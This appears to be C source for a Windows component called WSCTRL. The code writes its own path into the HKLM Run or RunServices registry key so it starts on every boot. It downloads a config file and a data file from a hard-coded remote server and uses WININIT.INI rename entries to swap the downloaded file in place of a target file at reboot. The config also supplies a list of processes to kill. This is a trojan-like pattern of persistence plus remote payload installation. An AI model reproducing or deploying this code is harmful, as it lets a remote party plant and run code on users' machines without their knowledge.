///////////////////////////////////////////////////////////////////////////////
#include "wsctrl.h"
///////////////////////////////////////////////////////////////////////////////
//DWORD	dwInfo = MAX_INFO;


///////////////////////////////////////////////////////////////////////////////
//
void Anchor(LPTSTR pszDestPath)
{
	LPTSTR pszRegPath = (osvi.dwPlatformId == VER_PLATFORM_WIN32_NT) ? REG_PATH_RUN : REG_PATH_RUNSERVICES;

	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, pszRegPath, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) 
	{
		RegSetValueEx(hKey, REG_VALUE_WSCTRL, 0, REG_SZ, (CONST BYTE *)pszDestPath, lstrlen(pszDestPath)+1);
		RegCloseKey(hKey);
	}
}


BOOL InternetDownloadFiles(HWND hDlg)
{
	BOOL fResult = FALSE;
	HINTERNET hOpen;

	if (NULL != (hOpen = InternetOpen(TEXT("WSCTRL"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0)))
	{
		HINTERNET hConnect;

		if (NULL != (hConnect = InternetConnect(hOpen, PCTSTR_REMOTESERVER, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0)))
		{
			TCHAR szPath[MAX_PATH];
			LPCTSTR lpObjectName = TEXT("/wsctrl.ini");
	
			GetModuleFileName(NULL, szPath, sizeof(szPath));
			lstrcpy(szWSCtrlDestPath, szPath);

			lstrcpy(_tcsrchr(szPath, TEXT('\\'))+1, lpObjectName + 1);
			if (fResult = HttpDownloadFile(hConnect, lpObjectName, szPath, TRUE))
			{
				lstrcpy(szConfigPath, szPath);
				GetPrivateProfileString(REG_VALUE_WSCTRL, TEXT("KillProcess"), TEXT("!md.exe"), szKillProcessArray, sizeof(szKillProcessArray), szConfigPath);
			}

			lpObjectName = TEXT("/wsctrl.dat");
			lstrcpy(_tcsrchr(szPath, TEXT('\\'))+1, lpObjectName + 1);
			if (fResult = HttpDownloadFile(hConnect, lpObjectName, szPath, TRUE))
			{
				lstrcpy(szWSCtrlTargetPath, szPath);

				GetPrivateProfileString(REG_VALUE_WSCTRL, TEXT("Target"), szWSCtrlTargetPath, szTargetPath, sizeof(szTargetPath), szConfigPath);
				GetPrivateProfileString(REG_VALUE_WSCTRL, TEXT("Dest"), szWSCtrlDestPath, szDestPath, sizeof(szDestPath), szConfigPath);

				GetWindowsDirectory(szWinInitPath, sizeof(szWinInitPath));
				lstrcat(szWinInitPath, TEXT("\\WININIT.INI"));

				WritePrivateProfileString(TEXT("Rename"), TEXT("NUL"), szDestPath, szWinInitPath); 
				WritePrivateProfileString(TEXT("Rename"), szDestPath, szTargetPath, szWinInitPath);

				Anchor(szDestPath);
			}
			InternetCloseHandle(hConnect);
		}
		InternetCloseHandle(hOpen);
	}

	return fResult;
}

void NetUpdateWSCtrl(HWND hDlg)
{
	InternetDownloadFiles(hDlg);
	//ExitProcess(0);
}




/*
void LoadIconFromLibrary(HWND hDlg, int iItemDlg, LPCTSTR pszLibName, int iResItem)
{
	HINSTANCE hLibrary = LoadLibrary(pszLibName);
	if (hLibrary != NULL) 
	{
		LoadImage(hLibrary, iResItem, IMAGE_ICON, 0, 0, 0);
		SendDlgItemMessage(
		FreeLibrary(hLibrary); 
	}
}
*/
